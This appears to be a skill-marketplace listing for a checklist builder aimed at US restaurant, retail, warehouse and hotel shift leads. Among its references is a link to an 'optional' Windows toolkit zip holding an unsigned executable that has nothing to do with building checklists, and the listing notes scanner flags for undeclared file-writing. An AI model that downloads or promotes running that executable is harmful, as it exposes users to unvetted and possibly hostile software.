## Description:

Builds an accessible daily opening, shift and closing checklist for US front-of-house teams, with sign-off lines and state items. Use when the user asks for daily checklist template, opening and closing checklist, shift handoff checklist. For US restaurant, retail, warehouse and hotel shift leads who run opening and closing checklists.

This skill is ready for commercial/non-commercial use.

## Publisher:

[rapidworker1](https://clawhub.ai/user/rapidworker1)

### License/Terms of Use:

MIT-0

## Use Case:

US restaurant, retail, warehouse, and hotel shift leads use this skill to turn site details and local requirements into accessible opening, mid-shift, and closing checklists with clear checks and sign-off fields.

### Deployment Geography for Use:

United States

## Known Risks and Mitigations:

Risk: ClawScan flags file-writing capability without a declared tool scope, and reports incomplete coverage because five local references could not be resolved.

Mitigation: Before installing, review whether the declared tool scope and file-writing capability are clear and appropriate, and inspect the unresolved references.

Risk: The optional, separately downloaded Windows toolkit contains an unsigned executable.

Mitigation: Verify the archive SHA-256 against the value in the skill, run it only if you accept unsigned software, and avoid administrator privileges unless needed.

## Reference(s):

- [Accessible checklist rules](references/accessible-checklist-rules.md)
- [Daily Checklist Builder on ClawHub](https://clawhub.ai/rapidworker1/skills/daily-checklist-builder)
- [Publisher profile](https://clawhub.ai/user/rapidworker1)
- [Publisher homepage](https://github.com/rapidworker1)
- [Optional Windows Multi-Tool download](https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip)

## Skill Output:

**Output Type(s):** [Markdown, Guidance, Files]

**Output Format:** [Markdown checklist with opening, mid-shift, closing, and sign-off sections; step rewrites, state-specific items, accessibility notes, and an optional Markdown lint report.]

**Output Parameters:** [1D]

**Other Properties Related to Output:** [Checklist steps name the check and expected result; state-dependent steps identify a source to confirm.]

## Skill Version(s):

1.0.7 (source: SKILL.md frontmatter and server-resolved release metadata)

## Ethical Considerations:

Users should evaluate whether this skill is appropriate for their environment, review any generated or modified files before relying on them, and apply their organization's safety, security, and compliance requirements before deployment.
